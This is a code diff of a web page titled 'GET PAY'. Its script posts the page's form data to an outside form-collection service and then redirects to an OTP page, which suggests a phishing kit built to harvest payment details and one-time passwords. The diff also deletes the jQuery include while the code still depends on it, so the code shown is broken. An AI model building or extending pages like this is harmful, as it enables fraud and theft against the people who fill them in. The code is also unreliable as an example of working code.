@@ -5,37 +5,33 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>GET PAY</title>
   <link rel="stylesheet" href="style.css">
-  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
   <script>
-    $(document).ready(function() {
-      $('form').submit(function(event) {
-        event.preventDefault(); // Prevent form submission
+  $(document).ready(function() {
+    $('form').submit(function(event) {
+      event.preventDefault(); // Prevent form submission
 
-        // Send the form data to Basin using AJAX
-        $.ajax({
-          url: 'https://usebasin.com/f/08d4cd611619', // Replace with your Basin API
-          method: 'POST',
-          data: $('form').serialize(),
-          dataType: 'json',
-          success: function(response) {
-            if (response.success) {
-              redirectToOTP();
-            } else {
-              alert('An error occurred. Please try again.');
-            }
-          },
-          error: function(xhr, status, error) {
-            console.log(xhr.responseText);
-            alert('An error occurred. Please try again.');
-          }
-        });
+      // Send the form data to Basin using AJAX
+      $.ajax({
+        url: 'https://usebasin.com/f/08d4cd611619', // Replace with your Basin API
+        method: 'POST',
+        data: $('form').serialize(),
+        dataType: 'json',
+        success: function(response) {
+          redirectToOTP();
+        },
+        error: function(xhr, status, error) {
+          console.log(xhr.responseText);
+          alert('An error occurred. Please try again.');
+        }
       });
     });
+  });
 
-    function redirectToOTP() {
-      window.location.href = 'otp.html';
-    }
-  </script>
+  function redirectToOTP() {
+    window.location.href = 'otp.html';
+  }
+</script>
+
 </head>
 <body>
   <header>
